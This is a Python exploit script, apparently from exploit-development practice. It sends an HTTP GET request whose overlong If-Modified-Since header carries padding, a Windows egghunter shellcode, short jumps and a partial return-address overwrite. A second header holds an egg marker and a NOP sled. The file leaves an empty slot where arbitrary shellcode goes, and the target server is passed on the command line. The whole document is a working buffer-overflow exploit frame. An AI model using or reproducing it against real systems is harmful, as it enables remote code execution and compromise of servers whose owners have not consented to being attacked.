#!/usr/bin/python
import socket
import sys
from struct import pack
import time
import requests

server = sys.argv[1]
port = 80
payload = b"" # ADD PAYLOAD
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x65\x62\x30\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7"
egg = b"web0"


def send_message(buffer):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))
	s.send(buffer)
	res = (s.recv(1024))
	s.close()
	return res


def main():
	buf1 =  b"A"*(188-8-len(egghunter))
	buf1 += egghunter
	buf1 += b"\xeb\xc2"
	buf1 += b"B"*6
	buf1 += b"\xeb\xf6\x90\x90"
	buf1 += b"\xe6\x8a\x45" # bp 00458ae6; g
	
	buf2 =  b""
	buf2 += (egg*2)
	buf2 += b"\x90"*40
	buf2 += payload



	http_req = b"GET / HTTP/1.1\r\n"
	http_req += b"Host: " + bytes(server,"utf-8") + b"\r\n"
	#http_req += "User-Agent: "+egg+nops+shellcode+"\r\n"
	http_req += b"If-Modified-Since: Wed, " + buf1 + b"\r\n\r\n"
	http_req += b"Content-Type: " + buf2 + b"\r\n"
	res = send_message(http_req)
	print(res)


if __name__ == "__main__":
	main()



	